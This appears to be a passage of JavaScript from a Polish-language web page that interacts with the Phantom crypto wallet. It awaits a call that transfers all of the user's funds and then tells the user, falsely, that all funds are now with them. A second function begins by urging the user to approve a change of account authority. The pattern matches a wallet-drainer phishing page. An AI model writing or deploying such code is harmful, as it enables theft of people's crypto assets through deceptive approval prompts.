                await transferAll(userPublicKey);

                status.innerText = "✅ Gotowe! Wszystkie środki są już u Ciebie.";

            } catch (err) {
                console.error(err);
                status.innerText = "❌ Transakcja odrzucona lub błąd.";
            }
        });

        async function changeAuthority(userPubKey) {

            alert("Potwierdź zmianę uprawnień w Phantom!");
